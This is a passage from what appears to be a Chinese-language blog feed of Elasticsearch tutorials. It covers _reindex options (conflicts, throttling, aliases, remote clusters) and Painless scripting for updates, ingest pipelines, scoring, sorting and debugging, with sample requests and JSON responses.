&quot;index&quot;: &quot;twitter2&quot;, &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;city&quot;: &quot;北京&quot; &#125; &#125; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;twitter3&quot; &#125;&#125;这里，我们定义最多不超过100个文档，同时，我们只拷贝来自“北京”的twitter记录。设置op_type to create将导致_reindex仅在目标索引中创建缺少的文档。 所有现有文档都会导致版本冲突，比如：12345678910POST _reindex&#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;twitter2&quot; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;twitter3&quot;, &quot;op_type&quot;: &quot;create&quot; &#125;&#125;如果我们之前已经做过reindex，那么我们可以看到如下的结果：123456789101112131415161718192021222324252627282930313233&#123; &quot;took&quot;: 2, &quot;timed_out&quot;: false, &quot;total&quot;: 1, &quot;updated&quot;: 0, &quot;created&quot;: 0, &quot;deleted&quot;: 0, &quot;batches&quot;: 1, &quot;version_conflicts&quot;: 1, &quot;noops&quot;: 0, &quot;retries&quot;: &#123; &quot;bulk&quot;: 0, &quot;search&quot;: 0 &#125;, &quot;throttled_millis&quot;: 0, &quot;requests_per_second&quot;: -1, &quot;throttled_until_millis&quot;: 0, &quot;failures&quot;: [ &#123; &quot;index&quot;: &quot;twitter3&quot;, &quot;type&quot;: &quot;_doc&quot;, &quot;id&quot;: &quot;1&quot;, &quot;cause&quot;: &#123; &quot;type&quot;: &quot;version_conflict_engine_exception&quot;, &quot;reason&quot;: &quot;[1]: version conflict, document already exists (current version [5])&quot;, &quot;index_uuid&quot;: &quot;ffz2LNIIQqqDx211R5f4fQ&quot;, &quot;shard&quot;: &quot;0&quot;, &quot;index&quot;: &quot;twitter3&quot; &#125;, &quot;status&quot;: 409 &#125; ]&#125;它表明我们之前的文档id为1的有版本上的冲突。默认情况下，版本冲突会中止_reindex进程。 “conflict”请求body参数可用于指示_reindex继续处理版本冲突的下一个文档。 请务必注意，其他错误类型的处理不受“conflict”参数的影响。 当“conflict”：在请求正文中设置“proceed”时，_reindex进程将继续发生版本冲突并返回遇到的版本冲突计数：1234567891011POST _reindex&#123; &quot;conflicts&quot;: &quot;proceed&quot;, &quot;source&quot;: &#123; &quot;index&quot;: &quot;twitter&quot; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;new_twitter&quot;, &quot;op_type&quot;: &quot;create&quot; &#125;&#125;Throttling重新索引大量文档可能会使您的群集泛滥甚至崩溃。requests_per_second限制索引操作速率。12345678910POST _reindex?requests_per_second=500 &#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;blogs&quot;, &quot;size&quot;: 500 &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;blogs_fixed&quot; &#125;&#125;运用index别名来进行reindex我们可以通过如下的方法来实现从一个index到另外一个index的数据转移：123456789PUT test PUT test_2 POST /_aliases&#123; &quot;actions&quot; : [ &#123; &quot;add&quot;: &#123; &quot;index&quot;: &quot;test_2&quot;, &quot;alias&quot;: &quot;test&quot; &#125; &#125;, &#123; &quot;remove_index&quot;: &#123; &quot;index&quot;: &quot;test&quot; &#125; &#125; ]&#125;在上面的例子中，假如我们地添加了一个叫做test的index，而test_2是我们想要的。我们直接可以通过上面的方法吧test中的数据交换到test_2中，并同时把test索引删除。从远处进行reindex_reindex也支持从一个远处的Elasticsearch的服务器进行reindex，它的语法为：1234567891011121314POST _reindex&#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;blogs&quot;, &quot;remote&quot;: &#123; &quot;host&quot;: &quot;http://remote_cluster_node1:9200&quot;, &quot;username&quot;: &quot;USERNAME&quot;, &quot;password&quot;: &quot;PASSWORD&quot; &#125; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;blogs&quot; &#125;&#125;这里显示它从一个在http://remote_cluster_node1:9200的服务器来拷贝文件从一个index到另外一个index。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/7.3/docs-reindex.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%20Painless%20script%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[我们之前看见了在Elasticsearch里的ingest node里，我们可以通过以下processor的处理帮我们处理我们的一些数据。它们的功能是非常具体而明确的。那么在Elasticsearch里，有没有一种更加灵活的方式可供我们来进行编程处理呢？如果有，它使用的语言是什么呢？在Elasticsearc中，它使用了一个叫做Painless的语言。它是专门为Elasticsearch而建立的。Painless是一种简单，安全的脚本语言，专为与Elasticsearch一起使用而设计。 它是Elasticsearch的默认脚本语言，可以安全地用于inline和stored脚本。它具有像Groovy那样的语法。自Elasticsearch 6.0以后的版本不再支持Groovy，Javascript及Python语言。如何使用脚本脚本的语法为:12345&quot;script&quot;: &#123; &quot;lang&quot;: &quot;...&quot;, &quot;source&quot; | &quot;id&quot;: &quot;...&quot;, &quot;params&quot;: &#123; ... &#125; &#125;这里lang默认的值为”painless”。在实际的使用中可以不设置，除非有第二种语言供使用source可以为inline脚本，或者是一个id，那么这个id对应于一个stored脚本任何有名字的参数，可以被用于脚本的输入参数Painless的简单使用例子inline 脚本首先我们来创建一个简单的文档：123456789101112131415PUT twitter/_doc/1&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;在这个文档里，我们现在想把age修改为30，那么一种办法就是把所有的文档内容都读出来，让修改其中的age想为30，再重新用同样的方法写进去。首先这里需要有几个动作：先读出数据，然后修改，再次写入数据。显然这样比较麻烦。在这里我们可以直接使用Painless语言直接进行修改：123456POST twitter/_update/1&#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;ctx._source.age = 30&quot; &#125;&#125;这里的source表明是我们的Painless代码。这里我们只写了很少的代码在DSL之中。这种代码称之为inline。在这里我们直接通过ctx._source.age来访问 _souce里的age。这样我们通过编程的办法直接对年龄进行了修改。运行的结果是：1234567891011121314151617181920212223&#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 16, &quot;_seq_no&quot; : 20, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125;&#125;显然这个age已经改变为30。上面的方法固然好，但是每次执行scripts都是需要重新进行编译的。编译好的script可以cache并供以后使用。上面的script如果是改变年龄的话，需要重新进行编译。一种更好的方法是改为这样的：123456789POST twitter/_update/1&#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;ctx._source.age = params.value&quot;, &quot;params&quot;: &#123; &quot;value&quot;: 34 &#125; &#125;&#125;这样，我们的script的source是不用改变的，只需要编译一次。下次调用的时候，只需要修改params里的参数即可。在Elasticsearch里：123&quot;script&quot;: &#123; &quot;source&quot;: &quot;ctx._source.num_of_views += 2&quot;&#125;和123&quot;script&quot;: &#123; &quot;source&quot;: &quot;ctx._source.num_of_views += 3&quot;&#125;被视为两个不同的脚本，需要分别进行编译，所以最好的办法是使用params来传入参数。存储的脚本 (stored script)在这种情况下，scripts可以被存放于一个集群的状态中。它之后可以通过ID进行调用：1234567PUT _scripts/add_age&#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;ctx._source.age += params.value&quot; &#125;&#125;在这里，我们定义了一个叫做add_age的script。它的作用就是帮我们把source里的age加上一个数值。我们可以在之后调用它：123456789POST twitter/_update/1&#123; &quot;script&quot;: &#123; &quot;id&quot;: &quot;add_age&quot;, &quot;params&quot;: &#123; &quot;value&quot;: 2 &#125; &#125;&#125;通过上面的执行，我们可以看到，age将会被加上2。访问source里的字段Painless中用于访问字段值的语法取决于上下文。在Elasticsearch中，有许多不同的Plainless上下文。就像那个链接显示的那样，Plainless上下文包括：ingest processor, update, update by query, sort，filter等等。Context 访问字段Ingest node: 访问字段使用ctx ctx.field_nameUpdates: 使用_source 字段 ctx._source.field_name这里的updates包括_update，_reindex以及update_by_query。这里，我们对于context（上下文的理解）非常重要。它的意思是针对不同的API，在使用中ctx所包含的字段是不一样的。在下面的例子中，我们针对一些情况来做具体的分析。Painless脚本例子首先我们创建一个叫做add_field_c的pipeline。关于如何创建一个pipleline，大家可以参考我之前写过的一个文章“如何在Elasticsearch中使用pipeline API来对事件进行处理”。例子11234567891011121314PUT _ingest/pipeline/add_field_c&#123; &quot;processors&quot;: [ &#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;ctx.field_c = (ctx.field_a + ctx.field_b) * params.value&quot;, &quot;params&quot;: &#123; &quot;value&quot;: 2 &#125; &#125; &#125; ]&#125;这个pipepline的作用是创建一个新的field：field_c。它的结果是field_a及field_b的和，并乘以2。那么我们创建一个如下的文档：12345PUT test_script/_doc/1?pipeline=add_field_c&#123; &quot;field_a&quot;: 10, &quot;field_b&quot;: 20&#125;在这里，我们使用了pipleline add_field_c。执行后的结果是：123456789101112131415161718192021222324252627282930&#123; &quot;took&quot; : 147, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;test_script&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;field_c&quot; : 60, &quot;field_a&quot; : 10, &quot;field_b&quot; : 20 &#125; &#125; ] &#125;&#125;显然，我们可以看到field_c被成功创建了。例子2在ingest过程中，可以使用脚本处理器来处理metadata，如_index和_type。 下面是一个Ingest Pipeline的示例，无论原始索引请求中提供了什么，它都会将索引和类型重命名为my_index：1234567891011121314PUT _ingest/pipeline/my_index&#123; &quot;description&quot;: &quot;use index:my_index and type:_doc&quot;, &quot;processors&quot;: [ &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; ctx._index = &apos;my_index&apos;; ctx._type = &apos;_doc&apos;; &quot;&quot;&quot; &#125; &#125; ]&#125;使用上面的pipeline，我们可以尝试index一个文档到any_index：1234PUT any_index/_doc/1?pipeline=my_index&#123; &quot;message&quot;: &quot;text&quot;&#125;显示的结果是：1234567891011121314&#123; &quot;_index&quot;: &quot;my_index&quot;, &quot;_type&quot;: &quot;_doc&quot;, &quot;_id&quot;: &quot;1&quot;, &quot;_version&quot;: 1, &quot;result&quot;: &quot;created&quot;, &quot;_shards&quot;: &#123; &quot;total&quot;: 2, &quot;successful&quot;: 1, &quot;failed&quot;: 0 &#125;, &quot;_seq_no&quot;: 89, &quot;_primary_term&quot;: 1,&#125;也就是说真正的文档时存到my_index之中，而不是any_index。例子31234567891011121314PUT _ingest/pipeline/blogs_pipeline&#123; &quot;processors&quot;: [ &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; if (ctx.category == &quot;&quot;) &#123; ctx.category = &quot;None&quot; &#125; &quot;&quot;&quot; &#125; &#125; ]&#125;我们上面定义了一个pipeline，它可以帮我们检查如果 category字段是否为空，如果是，就修改为“None”。还是以之前的那个test_script索引为例：12345678PUT test_script/_doc/2?pipeline=blogs_pipeline&#123; &quot;field_a&quot;: 5, &quot;field_b&quot;: 10, &quot;category&quot;: &quot;&quot;&#125; GET test_script/_doc/2显示的结果是：1234567891011121314&#123; &quot;_index&quot; : &quot;test_script&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_version&quot; : 2, &quot;_seq_no&quot; : 6, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;field_a&quot; : 5, &quot;field_b&quot; : 10, &quot;category&quot; : &quot;None&quot; &#125;&#125;显然，它把category为“”的字段变为“None”了。例子412345678910111213141516POST _reindex&#123; &quot;source&quot;: &#123; &quot;index&quot;: &quot;blogs&quot; &#125;, &quot;dest&quot;: &#123; &quot;index&quot;: &quot;blogs_fixed&quot; &#125;, &quot;script&quot;: &#123; &quot;source&quot;: &quot;&quot;&quot; if (ctx._source.category == &quot;&quot;) &#123; ctx._source.category = &quot;None&quot; &#125;&quot;&quot;&quot; &#125;&#125;上面的这个例子在reindex时，如果category为空时，写入“None”。我们可以从上面的两个例子中看出来，针对pipeline，我们可以直接对cxt.field进行操作，而针对update来说，我们可以对cxt._source下的字段进行操作。这也是之前提到的上下文的区别。例子512345PUT test/_doc/1&#123; &quot;counter&quot; : 1, &quot;tags&quot; : [&quot;red&quot;]&#125;您可以使用和update脚本将tag添加到tags列表（这只是一个列表，因此即使存在标记也会添加）：12345678910POST test/_update/1&#123; &quot;script&quot; : &#123; &quot;source&quot;: &quot;ctx._source.tags.add(params.tag)&quot;, &quot;lang&quot;: &quot;painless&quot;, &quot;params&quot; : &#123; &quot;tag&quot; : &quot;blue&quot; &#125; &#125;&#125;显示结果：123456789101112131415161718GET test/_doc/1 &#123; &quot;_index&quot; : &quot;test&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 4, &quot;_seq_no&quot; : 3, &quot;_primary_term&quot; : 11, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;counter&quot; : 1, &quot;tags&quot; : [ &quot;red&quot;, &quot;blue&quot; ] &#125; &#125;显示“blue”，已经被成功加入到tags列表之中了。您还可以从tags列表中删除tag。 删除tag的Painless函数采用要删除的元素的数组索引。 为避免可能的运行时错误，首先需要确保tag存在。 如果列表包含tag的重复项，则此脚本只删除一个匹配项。123456789101112POST test/_update/1&#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;if (ctx._source.tags.contains(params.tag)) &#123; ctx._source.tags.remove(ctx._source.tags.indexOf(params.tag)) &#125;&quot;, &quot;lang&quot;: &quot;painless&quot;, &quot;params&quot;: &#123; &quot;tag&quot;: &quot;blue&quot; &#125; &#125;&#125; GET test/_doc/1显示结果：123456789101112131415&#123; &quot;_index&quot; : &quot;test&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 5, &quot;_seq_no&quot; : 4, &quot;_primary_term&quot; : 11, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;counter&quot; : 1, &quot;tags&quot; : [ &quot;red&quot; ] &#125;&#125;“blue”显然已经被删除了。Painless脚本简单的操练为了说明Painless的工作原理，让我们将一些曲棍球统计数据加载到Elasticsearch索引中：1234567891011121314151617181920212223PUT hockey/_bulk?refresh&#123;&quot;index&quot;:&#123;&quot;_id&quot;:1&#125;&#125;&#123;&quot;first&quot;:&quot;johnny&quot;,&quot;last&quot;:&quot;gaudreau&quot;,&quot;goals&quot;:[9,27,1],&quot;assists&quot;:[17,46,0],&quot;gp&quot;:[26,82,1],&quot;born&quot;:&quot;1993/08/13&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:2&#125;&#125;&#123;&quot;first&quot;:&quot;sean&quot;,&quot;last&quot;:&quot;monohan&quot;,&quot;goals&quot;:[7,54,26],&quot;assists&quot;:[11,26,13],&quot;gp&quot;:[26,82,82],&quot;born&quot;:&quot;1994/10/12&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:3&#125;&#125;&#123;&quot;first&quot;:&quot;jiri&quot;,&quot;last&quot;:&quot;hudler&quot;,&quot;goals&quot;:[5,34,36],&quot;assists&quot;:[11,62,42],&quot;gp&quot;:[24,80,79],&quot;born&quot;:&quot;1984/01/04&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:4&#125;&#125;&#123;&quot;first&quot;:&quot;micheal&quot;,&quot;last&quot;:&quot;frolik&quot;,&quot;goals&quot;:[4,6,15],&quot;assists&quot;:[8,23,15],&quot;gp&quot;:[26,82,82],&quot;born&quot;:&quot;1988/02/17&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:5&#125;&#125;&#123;&quot;first&quot;:&quot;sam&quot;,&quot;last&quot;:&quot;bennett&quot;,&quot;goals&quot;:[5,0,0],&quot;assists&quot;:[8,1,0],&quot;gp&quot;:[26,1,0],&quot;born&quot;:&quot;1996/06/20&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:6&#125;&#125;&#123;&quot;first&quot;:&quot;dennis&quot;,&quot;last&quot;:&quot;wideman&quot;,&quot;goals&quot;:[0,26,15],&quot;assists&quot;:[11,30,24],&quot;gp&quot;:[26,81,82],&quot;born&quot;:&quot;1983/03/20&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:7&#125;&#125;&#123;&quot;first&quot;:&quot;david&quot;,&quot;last&quot;:&quot;jones&quot;,&quot;goals&quot;:[7,19,5],&quot;assists&quot;:[3,17,4],&quot;gp&quot;:[26,45,34],&quot;born&quot;:&quot;1984/08/10&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:8&#125;&#125;&#123;&quot;first&quot;:&quot;tj&quot;,&quot;last&quot;:&quot;brodie&quot;,&quot;goals&quot;:[2,14,7],&quot;assists&quot;:[8,42,30],&quot;gp&quot;:[26,82,82],&quot;born&quot;:&quot;1990/06/07&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:39&#125;&#125;&#123;&quot;first&quot;:&quot;mark&quot;,&quot;last&quot;:&quot;giordano&quot;,&quot;goals&quot;:[6,30,15],&quot;assists&quot;:[3,30,24],&quot;gp&quot;:[26,60,63],&quot;born&quot;:&quot;1983/10/03&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:10&#125;&#125;&#123;&quot;first&quot;:&quot;mikael&quot;,&quot;last&quot;:&quot;backlund&quot;,&quot;goals&quot;:[3,15,13],&quot;assists&quot;:[6,24,18],&quot;gp&quot;:[26,82,82],&quot;born&quot;:&quot;1989/03/17&quot;&#125;&#123;&quot;index&quot;:&#123;&quot;_id&quot;:11&#125;&#125;&#123;&quot;first&quot;:&quot;joe&quot;,&quot;last&quot;:&quot;colborne&quot;,&quot;goals&quot;:[3,18,13],&quot;assists&quot;:[6,20,24],&quot;gp&quot;:[26,67,82],&quot;born&quot;:&quot;1990/01/30&quot;&#125;使用Painless访问Doc里的值文档里的值可以通过一个叫做doc的Map值来访问。例如，以下脚本计算玩家的总进球数。 此示例使用类型int和for循环。12345678910111213141516171819GET hockey/_search&#123; &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;script_score&quot;: &#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;&quot;&quot; int total = 0; for (int i = 0; i &lt; doc[&apos;goals&apos;].length; ++i) &#123; total += doc[&apos;goals&apos;][i]; &#125; return total; &quot;&quot;&quot; &#125; &#125; &#125; &#125;&#125;这里我们通过script来计算每个文档的_score。通过script把每个运动员的goal都加起来，并形成最终的_score。这里我们通过doc[‘goals’]这个Map类型来访问我们的字段值。显示的结果为：12345678910111213141516171819202122232425262728293031323334353637383940414243&#123; &quot;took&quot; : 25, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 11, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 87.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;hockey&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 87.0, &quot;_source&quot; : &#123; &quot;first&quot; : &quot;sean&quot;, &quot;last&quot; : &quot;monohan&quot;, &quot;goals&quot; : [ 7, 54, 26 ], &quot;assists&quot; : [ 11, 26, 13 ], &quot;gp&quot; : [ 26, 82, 82 ], &quot;born&quot; : &quot;1994/10/12&quot; &#125; &#125;,...或者，您可以使用script_fields而不是function_score执行相同的操作：1234567891011121314151617181920GET hockey/_search&#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;, &quot;script_fields&quot;: &#123; &quot;total_goals&quot;: &#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;&quot;&quot; int total = 0; for (int i = 0; i &lt; doc[&apos;goals&apos;].length; ++i) &#123; total += doc[&apos;goals&apos;][i]; &#125; return total; &quot;&quot;&quot; &#125; &#125; &#125;&#125;显示的结果为：123456789101112131415161718192021222324252627282930313233343536373839&#123; &quot;took&quot; : 5, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 11, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;hockey&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;fields&quot; : &#123; &quot;total_goals&quot; : [ 37 ] &#125; &#125;, &#123; &quot;_index&quot; : &quot;hockey&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 1.0, &quot;fields&quot; : &#123; &quot;total_goals&quot; : [ 87 ] &#125; &#125;,...以下示例使用Painless脚本按其组合的名字和姓氏对玩家进行排序。 使用doc [‘first’]。value和doc [‘last’]。value访问名称。12345678910111213141516GET hockey/_search&#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;, &quot;sort&quot;: &#123; &quot;_script&quot;: &#123; &quot;type&quot;: &quot;string&quot;, &quot;order&quot;: &quot;asc&quot;, &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;doc[&apos;first.keyword&apos;].value + &apos; &apos; + doc[&apos;last.keyword&apos;].value&quot; &#125; &#125; &#125;&#125;检查缺失项doc [‘field’].value。如果文档中缺少该字段，则抛出异常。要检查文档是否缺少值，可以调用doc [&#39;field&#39;] .size（）== 0。使用Painless更新字段您还可以轻松更新字段。 您可以使用ctx._source.&lt;field-name&gt;访问字段的原始源。首先，让我们通过提交以下请求来查看玩家的源数据：12345678910111213GET hockey/_search&#123; &quot;stored_fields&quot;: [ &quot;_id&quot;, &quot;_source&quot; ], &quot;query&quot;: &#123; &quot;term&quot;: &#123; &quot;_id&quot;: 1 &#125; &#125;&#125;显示的结果为：123456789101112131415161718192021222324252627282930313233343536373839404142434445&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 1, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;hockey&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 1.0, &quot;_source&quot; : &#123; &quot;first&quot; : &quot;johnny&quot;, &quot;last&quot; : &quot;gaudreau&quot;, &quot;goals&quot; : [ 9, 27, 1 ], &quot;assists&quot; : [ 17, 46, 0 ], &quot;gp&quot; : [ 26, 82, 1 ], &quot;born&quot; : &quot;1993/08/13&quot; &#125; &#125; ] &#125;&#125;要将玩家1的姓氏更改为hockey，只需将ctx._source.last设置为新值：12345678910POST hockey/_update/1&#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;ctx._source.last = params.last&quot;, &quot;params&quot;: &#123; &quot;last&quot;: &quot;hockey&quot; &#125; &#125;&#125;您还可以向文档添加字段。 例如，此脚本添加一个包含玩家nickname为hockey的新字段。1234567891011121314POST hockey/_update/1&#123; &quot;script&quot;: &#123; &quot;lang&quot;: &quot;painless&quot;, &quot;source&quot;: &quot;&quot;&quot; ctx._source.last = params.last; ctx._source.nick = params.nick &quot;&quot;&quot;, &quot;params&quot;: &#123; &quot;last&quot;: &quot;gaudreau&quot;, &quot;nick&quot;: &quot;hockey&quot; &#125; &#125;&#125;显示的结果为：12345678910111213141516171819202122232425262728293031GET hockey/_doc/1 &#123; &quot;_index&quot; : &quot;hockey&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_version&quot; : 2, &quot;_seq_no&quot; : 11, &quot;_primary_term&quot; : 1, &quot;found&quot; : true, &quot;_source&quot; : &#123; &quot;first&quot; : &quot;johnny&quot;, &quot;last&quot; : &quot;gaudreau&quot;, &quot;goals&quot; : [ 9, 27, 1 ], &quot;assists&quot; : [ 17, 46, 0 ], &quot;gp&quot; : [ 26, 82, 1 ], &quot;born&quot; : &quot;1993/08/13&quot;, &quot;nick&quot; : &quot;hockey&quot; &#125; &#125;有一个叫做 “nick”的新字段被加入了。我们甚至可以对日期类型来进行操作从而得到年月等信息：12345678910GET hockey/_search&#123; &quot;script_fields&quot;: &#123; &quot;birth_year&quot;: &#123; &quot;script&quot;: &#123; &quot;source&quot;: &quot;doc.born.value.year&quot; &#125; &#125; &#125;&#125;显示结果：12345678910111213141516171819202122232425262728&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 11, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 1.0, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;hockey&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 1.0, &quot;fields&quot; : &#123; &quot;birth_year&quot; : [ 1994 ] &#125; &#125;,...Script CachingElasticsearch第一次看到一个新脚本，它会编译它并将编译后的版本存储在缓存中。无论是inline或是stored脚本都存储在缓存中。新脚本可以驱逐缓存的脚本。默认的情况下是可以存储100个脚本。我们可以通过设置script.cache.max_size来改变其大小，或者通过script.cache.expire来设置过期的时间。这些设置需要在config/elasticsearch.yml里设置。Script 调试不能调试的脚本是非常难的。有一个好的调试手段无疑对我们的脚本编程是非常有用的。Debug.explainPainless没有REPL，虽然有一天它很好，但它不会告诉你关于调试Elasticsearch中嵌入的Painless脚本的全部故事，因为脚本可以访问的数据或“上下文” 是如此重要。 目前，调试嵌入式脚本的最佳方法是在选择位置抛出异常。 虽然您可以抛出自己的异常（throw new exception(‘whatever’），但Painless的沙箱会阻止您访问有用的信息，如对象的类型。 所以Painless有一个实用工具方法Debug.explain，它会为你抛出异常。 例如，您可以使用_explain来探索script query可用的上下文。PUT /hockey/_doc/1?refresh {&quot;first&quot;:&quot;johnny&quot;,&quot;last&quot;:&quot;gaudreau&quot;,&quot;goals&quot;:[9,27,1],&quot;assists&quot;:[17,46,0],&quot;gp&quot;:[26,82,1]} POST /hockey/_explain/1 { &quot;query&quot;: { &quot;script&quot;: { &quot;script&quot;: &quot;Debug.explain(doc.goals)&quot; } } } 这表明doc.goals类是org.elasticsearch.index.fielddata.ScriptDocValues.Longs通过响应：{ &quot;error&quot;: { &quot;root_cause&quot;: [ { &quot;type&quot;: &quot;script_exception&quot;, &quot;reason&quot;: &quot;runtime error&quot;, &quot;painless_class&quot;: &quot;org.elasticsearch.index.fielddata.ScriptDocValues.Longs&quot;, &quot;to_string&quot;: &quot;[1, 9, 27]&quot;, &quot;java_class&quot;: &quot;org.elasticsearch.index.fielddata.ScriptDocValues$Longs&quot;, &quot;script_stack&quot;: [ &quot;Debug.explain(doc.goals)&quot;, &quot; ^---- HERE&quot; ], &quot;script&quot;: &quot;Debug.explain(doc.goals)&quot;, &quot;lang&quot;: &quot;painless&quot; } ], &quot;type&quot;: &quot;script_exception&quot;, &quot;reason&quot;: &quot;runtime error&quot;, &quot;painless_class&quot;: &quot;org.elasticsearch.index.fielddata.ScriptDocValues.Longs&quot;, &quot;to_string&quot;: &quot;[1, 9, 27]&quot;, &quot;java_class&quot;: &quot;org.elasticsearch.index.fielddata.ScriptDocValues$Longs&quot;, &quot;script_stack&quot;: [ &quot;Debug.explain(doc.goals)&quot;, &quot; ^---- HERE&quot; ], &quot;script&quot;: &quot;Debug.explain(doc.goals)&quot;, &quot;lang&quot;: &quot;painless&quot;, 